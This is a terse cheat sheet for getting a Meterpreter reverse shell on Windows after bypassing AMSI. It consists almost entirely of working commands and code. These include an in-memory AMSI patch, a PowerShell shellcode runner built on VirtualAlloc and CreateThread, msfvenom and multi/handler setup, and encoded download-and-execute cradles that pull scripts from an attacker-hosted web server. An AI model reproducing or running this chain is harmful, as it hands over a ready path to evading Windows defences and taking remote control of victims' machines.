Once AMSI has been bypassed, the following can be used to receive a shell

Create PS1 msfvenom payload:

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
```

Update run.txt:

```bash
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like"*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name-like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf =@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}

    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
                    }

function getDelegateType {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])

    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')

    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

$lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

#Replace below with: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
[Byte[]] $buf = <snip>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

Configure Multi-Handler:

```bash
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST x.x.x.x;set LPORT 443;run;"
```

Create web server to host run.txt

```bash
sudo python3 -m http.server 80
```

Create payload:

```bash
pwsh  
$text = "(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/run.txt') | IEX"  
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)  
$EncodedText = [Convert]::ToBase64String($bytes)  
$EncodedText
```

To include the AMSI bypass (this may need to be executed a couple of times):

```bash
pwsh  
$text = "(new-object system.net.webclient).downloadstring('http://x.x.x.x/amsi.txt') | IEX; (new-object system.net.webclient).downloadstring('http://x.x.x.x/run.txt') | IEX"  
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)  
$EncodedText = [Convert]::ToBase64String($bytes)  
$EncodedText

```

Send this to the target:

```bash
powershell -enc <string>
```

